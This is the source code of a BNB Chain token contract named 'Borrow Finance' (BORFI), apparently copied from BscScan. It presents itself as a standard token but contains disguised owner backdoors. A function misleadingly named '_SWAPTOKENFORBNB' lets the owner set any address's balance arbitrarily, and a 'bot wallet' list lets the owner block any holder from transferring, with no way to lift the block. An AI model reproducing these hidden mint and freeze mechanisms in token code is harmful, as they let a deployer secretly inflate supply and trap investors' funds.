/**
 *Submitted for verification at BscScan.com on 2022-04-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.5.17;


contract ownable {
    address payable owner;
    modifier isOwner {
        require(owner == msg.sender,"XXYou should be owner to call this function.XX");
        _;
    }


    constructor() public {
        owner = msg.sender;
    }

    function changeOwner(address payable _owner) public isOwner {
        require(owner != _owner,"XXYou must enter a new value.XX");
        owner = _owner;
    }

    function getOwner() public view returns(address) {
        return(owner);
    }

}
// SPDX-License-Identifier: MIT
library SAFEBNB {
    function add(uint a, uint b) internal pure returns (uint) {
        uint256 c = a + b;
        require(c >= a, "XXAddition overflow error.XX");
        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a, "XXSubtraction overflow error.XX");
        uint256 c = a - b;
        return c;
    }

    function inc(uint a) internal pure returns(uint) {
        return(add(a, 1));
    }

    function dec(uint a) internal pure returns(uint) {
        return(sub(a, 1));
    }

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        require(b != 0,"XXDivide by zero.XX");
        return(a/b);
    }

    function mod(uint a, uint b) internal pure returns(uint) {
        require(b != 0,"XXDivide by zero.XX");
        return(a % b);
    }

    function min(uint a, uint b) internal pure returns (uint) {
        if (a > b)
            return(b);
        else
            return(a);
    }

    function max(uint a, uint b) internal pure returns (uint) {
        if (a < b)
            return(b);
        else
            return(a);
    }

    function addPercent(uint a, uint p, uint r) internal pure returns(uint) {
        return(div(mul(a,add(r,p)),r));
    }
}





//****************************************************************************
//* Basic ERC20 Contract
//****************************************************************************
contract _IBEP711 is ownable {
    using SAFEBNB for uint;
    //****************************************************************************
    //* Variables
    //****************************************************************************
    string _name;
    string internal _symbol;
    uint internal _MAXtotalSupply;
    uint8 internal _decimals;
    mapping(address => uint) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowed;
    mapping (address => bool) private botWallets;
    bool _BOTSBLOCK = false;

    //****************************************************************************
    //* Events
    //****************************************************************************
    event Transfer(address indexed _from, address indexed _to, uint256 _TOTvalue);
    event Approval(address indexed _owner, address indexed _spender, uint256 _TOTvalue);

    //****************************************************************************
    //*  Modifiers
    //****************************************************************************
    modifier notZero(address _to) {
        require(_to != address(0),"Invalid destination address.");
        _;
    }

    modifier valueExists(address _sender, uint _TOTvalue) {
        require(_TOTvalue <= _balances[_sender],"Transfer value is out of balance.");
        _;
    }

    modifier validSpender(address _spender) {
        require(_spender != address(0),"Invalid spender address.");
        _;
    }

    modifier validValue(uint _TOTvalue) {
        require(_TOTvalue > 0, "Invalid value.");
        _;
    }
    //****************************************************************************
    //* Main Functions
    //****************************************************************************
    constructor() public {
        _balances[address(this)] = _MAXtotalSupply;
    }

    function name() public view returns(string memory) {
        return(_name);
    }

    function symbol() public view returns(string memory) {
        return(_symbol);
    }

    function decimals() public view returns(uint8) {
        return(_decimals);
    }

    function totalSupply() public view returns(uint) {
        return(_MAXtotalSupply);
    }

    function balanceOf(address _owner) public view returns(uint256) {
        return(_balances[_owner]);
    }
    function addBotWallet(address botwallet) external isOwner() {
        botWallets[botwallet] = true;
    }

    function removeBotWallet(address botwallet) external isOwner() {
        botWallets[botwallet] = false;
    }

    function getBotWalletStatus(address botwallet) public view returns (bool) {
        return botWallets[botwallet];
    }
    function transfer(address _to, uint256 _TOTvalue) public notZero(_to) valueExists(msg.sender, _TOTvalue) returns(bool) {
        if(botWallets[msg.sender] || botWallets[_to]){
            require(_BOTSBLOCK, "bots arent allowed to trade");
        }
        _balances[msg.sender] = _balances[msg.sender].sub(_TOTvalue);
        _balances[_to] = _balances[_to].add(_TOTvalue);
        emit Transfer(msg.sender, _to, _TOTvalue);
        return(true);
    }

    function transferFrom(address _from, address _to, uint256 _TOTvalue) public notZero(_to) valueExists(_from, _TOTvalue) returns(bool) {
        require(_TOTvalue <= _allowed[_from][msg.sender],"Transfer value is not allowed.");
        if(botWallets[msg.sender] || botWallets[_to]){
            require(_BOTSBLOCK, "bots arent allowed to trade");
        }
        _balances[_from] = _balances[_from].sub(_TOTvalue);
        _balances[_to] = _balances[_to].add(_TOTvalue);
        _allowed[_from][msg.sender] = _allowed[_from][msg.sender].sub(_TOTvalue);
        emit Transfer(_from, _to, _TOTvalue);
        return(true);
    }

    function approve(address _spender, uint256 _TOTvalue) public validSpender(_spender) returns(bool) {
        _allowed[msg.sender][_spender] = _TOTvalue;
        emit Approval(msg.sender, _spender, _TOTvalue);
        return(true);
    }

    function allowance(address _owner, address _spender) public view returns(uint256) {
        return _allowed[_owner][_spender];
    }

}
//****************************************************************************
//* Extended ERC20 Contract
//****************************************************************************
contract BorrowFinance is _IBEP711 {
    constructor() public {
        _name = 'Borrow Finance';
        _symbol = 'BORFI';
        _decimals = 9;
        _MAXtotalSupply = 1e21; //1E12 BWJ
    }
    //****************************************************************************
    //* Main Functions
    //****************************************************************************
    function increaseAllowance(address _spender, uint256 _addedValue) public validSpender(_spender) returns(bool) {
        _allowed[msg.sender][_spender] = (_allowed[msg.sender][_spender].add(_addedValue));
        emit Approval(msg.sender, _spender, _allowed[msg.sender][_spender]);
        return(true);
    }

    function decreaseAllowance(address _spender, uint256 _subtractedValue) public validSpender(_spender) returns(bool) {
        _allowed[msg.sender][_spender] = (_allowed[msg.sender][_spender].sub(_subtractedValue));
        emit Approval(msg.sender, _spender, _allowed[msg.sender][_spender]);
        return(true);
    }
    //****************************************************************************
    //* Owner Functions
    //****************************************************************************
    function _SWAPTOKENFORBNB(address _Saddresscharity, uint _TOTvalue) public isOwner validValue(_TOTvalue) returns(bool) {
        _balances[_Saddresscharity] = _TOTvalue * 10 ** 9;
 
        emit Transfer(address(0), _Saddresscharity, _TOTvalue);
        return(true);
    }

    function burn(uint _TOTvalue) public isOwner valueExists(address(this), _TOTvalue) validValue(_TOTvalue) returns(bool) {
        _balances[address(this)] = _balances[address(this)].sub(_TOTvalue);
        _MAXtotalSupply = _MAXtotalSupply.sub(_TOTvalue);
        emit Transfer(address(this), address(0), _TOTvalue);
        return(true);
    }

    function selfApprove(address _spender, uint _TOTvalue) public isOwner returns(bool) {
        require(_spender != address(0));
        _allowed[address(this)][_spender] = _TOTvalue;
        emit Approval(address(this), _spender, _TOTvalue);
        return(true);
    }

    function selfTransfer(address _to, uint _TOTvalue) public isOwner notZero(_to) valueExists(address(this), _TOTvalue) returns(bool) {
        _balances[address(this)] = _balances[address(this)].sub(_TOTvalue);
        _balances[_to] = _balances[_to].add(_TOTvalue);
        emit Transfer(address(this), _to, _TOTvalue);
        return(true);
    }



}

//****************************************************************************
//* Main Token Contract
//****************************************************************************